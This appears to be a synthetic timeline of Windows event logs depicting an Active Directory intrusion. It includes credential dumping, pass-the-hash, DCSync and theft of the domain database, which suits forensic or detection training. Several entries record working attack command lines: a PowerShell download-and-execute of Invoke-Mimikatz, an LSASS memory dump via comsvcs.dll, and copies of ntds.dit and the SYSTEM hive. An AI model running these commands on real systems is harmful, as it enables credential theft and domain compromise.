{"datetime": "2024-03-15T08:35:00Z", "timestamp_desc": "Process Create", "hostname": "WS01.corp.local", "username": "svc_backup", "EventID": "1", "message": "Process Create: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command sekurlsa::logonpasswords\" ParentImage: C:\\Users\\svc_backup\\AppData\\Roaming\\Microsoft\\Windows\\agent.exe User: CORP\\svc_backup Hashes: MD5=3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F"}
{"datetime": "2024-03-15T08:35:15Z", "timestamp_desc": "Process Access", "hostname": "WS01.corp.local", "username": "svc_backup", "EventID": "10", "message": "Process accessed: SourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TargetImage: C:\\Windows\\System32\\lsass.exe GrantedAccess: 0x1010 CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a5594|C:\\Windows\\System32\\KERNELBASE.dll+1e865|UNKNOWN(00000000004CDC13)"}
{"datetime": "2024-03-15T08:35:17Z", "timestamp_desc": "Privilege Use", "hostname": "WS01.corp.local", "username": "svc_backup", "EventID": "4673", "message": "A privileged service was called. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200 Service: Server: Security Privileges: SeTcbPrivilege SeLoadDriverPrivilege Process: Process ID: 0x2198 Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
{"datetime": "2024-03-15T08:35:20Z", "timestamp_desc": "Special Privilege Logon", "hostname": "WS01.corp.local", "username": "svc_backup", "EventID": "4672", "message": "Special privileges assigned to new logon. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200 Privileges: SeDebugPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeChangeNotifyPrivilege"}
{"datetime": "2024-03-15T08:35:25Z", "timestamp_desc": "Mimikatz LSASS Dump success - credentials extracted", "hostname": "WS01.corp.local", "username": "svc_backup", "EventID": "4688", "message": "A new process has been created. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Process Information: New Process ID: 0x22cc New Process Name: C:\\Windows\\System32\\rundll32.exe Process Command Line: rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 748 C:\\Users\\svc_backup\\AppData\\Local\\Temp\\lsass_dump.bin full"}
{"datetime": "2024-03-15T08:35:28Z", "timestamp_desc": "LSASS MiniDump file created", "hostname": "WS01.corp.local", "username": "svc_backup", "EventID": "11", "message": "File created: Image: C:\\Windows\\System32\\rundll32.exe TargetFilename: C:\\Users\\svc_backup\\AppData\\Local\\Temp\\lsass_dump.bin CreationUtcTime: 2024-03-15T08:35:28.000Z"}
{"datetime": "2024-03-15T08:36:00Z", "timestamp_desc": "Logon Type 9 NewCredentials - Pass-the-Hash", "hostname": "WS01.corp.local", "username": "mrodriguez", "EventID": "4624", "message": "An account was successfully logged on. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200 Logon Type: 9 New Logon: Security ID: CORP\\mrodriguez Account Name: mrodriguez Account Domain: CORP Logon ID: 0x5C2001 Logon Process: seclogo Authentication Package: Negotiate Network Information: Workstation Name: WS01 Source Network Address: - Source Port: - Additional Information: Logon GUID: {00000000-0000-0000-0000-000000000000} Linked Logon ID: 0x0 Network Account Name: mrodriguez Network Account Domain: CORP"}
{"datetime": "2024-03-15T08:36:05Z", "timestamp_desc": "Special Privilege - mrodriguez pass-the-hash session", "hostname": "WS01.corp.local", "username": "mrodriguez", "EventID": "4672", "message": "Special privileges assigned to new logon. Subject: Security ID: CORP\\mrodriguez Account Name: mrodriguez Account Domain: CORP Logon ID: 0x5C2001 Privileges: SeDebugPrivilege SeChangeNotifyPrivilege SeImpersonatePrivilege SeCreateGlobalPrivilege"}
{"datetime": "2024-03-15T08:36:15Z", "timestamp_desc": "DCSync replication request from WS01", "hostname": "DC01.corp.local", "username": "svc_backup", "EventID": "4662", "message": "An operation was performed on an object. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200 Object: Object Server: DS Object Type: domainDNS Object Name: DC=corp,DC=local Handle ID: 0x0 Operation: Operation Type: Object Access Accesses: Control Access Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} {89e95b76-444d-4c62-991a-0facbeda640c} DS-Replication-Get-Changes DS-Replication-Get-Changes-All"}
{"datetime": "2024-03-15T08:36:18Z", "timestamp_desc": "DCSync replication request from WS01 (second object)", "hostname": "DC01.corp.local", "username": "svc_backup", "EventID": "4662", "message": "An operation was performed on an object. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200 Object: Object Server: DS Object Type: domainDNS Object Name: DC=corp,DC=local Handle ID: 0x0 Operation Type: Object Access Accesses: Control Access Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes Additional Information: Parameter 1: - Parameter 2: -"}
{"datetime": "2024-03-15T08:36:25Z", "timestamp_desc": "User added to Domain Admins by attacker", "hostname": "DC01.corp.local", "username": "svc_backup", "EventID": "4728", "message": "A member was added to a security-enabled global group. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200 Member: Security ID: S-1-5-21-2832489128-1218823774-3428483479-1200 Account Name: CN=svc_backup,OU=Service Accounts,DC=corp,DC=local Group: Security ID: S-1-5-21-2832489128-1218823774-3428483479-512 Group Name: Domain Admins Group Domain: CORP Additional Information: Privileges: -"}
{"datetime": "2024-03-15T08:36:35Z", "timestamp_desc": "Explicit credentials logon - dadmin impersonation", "hostname": "WS01.corp.local", "username": "dadmin", "EventID": "4648", "message": "A logon was attempted using explicit credentials. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200 Logon GUID: {A1B2C3D4-0000-0000-0000-000000000000} Account Whose Credentials Were Used: Account Name: dadmin Account Domain: CORP Logon GUID: {00000000-0000-0000-0000-000000000000} Target Server Information: Target Server Name: DC01.corp.local Additional Information: network Additional Information: lsass Process Information: Process ID: 0x2198 Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
{"datetime": "2024-03-15T08:36:45Z", "timestamp_desc": "Logon as dadmin from WS01", "hostname": "DC01.corp.local", "username": "dadmin", "EventID": "4624", "message": "An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 New Logon: Security ID: CORP\\dadmin Account Name: dadmin Account Domain: CORP Logon ID: 0x6D3001 Network Information: Workstation Name: WS01 Source Network Address: 192.168.10.101 Source Port: 50800 Authentication Package: Kerberos Logon Process: Kerberos"}
{"datetime": "2024-03-15T08:37:00Z", "timestamp_desc": "NTDS.dit shadow copy command", "hostname": "DC01.corp.local", "username": "dadmin", "EventID": "1", "message": "Process Create: Image: C:\\Windows\\System32\\cmd.exe CommandLine: cmd.exe /c vssadmin create shadow /for=C: ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ParentCommandLine: powershell.exe -nop -exec bypass User: CORP\\dadmin"}
{"datetime": "2024-03-15T08:37:15Z", "timestamp_desc": "NTDS.dit file access from shadow copy", "hostname": "DC01.corp.local", "username": "dadmin", "EventID": "1", "message": "Process Create: Image: C:\\Windows\\System32\\cmd.exe CommandLine: cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds_backup.dit ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe User: CORP\\dadmin"}
{"datetime": "2024-03-15T08:37:20Z", "timestamp_desc": "NTDS.dit file created in temp", "hostname": "DC01.corp.local", "username": "dadmin", "EventID": "11", "message": "File created: Image: C:\\Windows\\System32\\cmd.exe TargetFilename: C:\\Windows\\Temp\\ntds_backup.dit CreationUtcTime: 2024-03-15T08:37:20.000Z"}
{"datetime": "2024-03-15T08:37:25Z", "timestamp_desc": "SYSTEM registry hive copy", "hostname": "DC01.corp.local", "username": "dadmin", "EventID": "1", "message": "Process Create: Image: C:\\Windows\\System32\\reg.exe CommandLine: reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM.hive ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe User: CORP\\dadmin"}
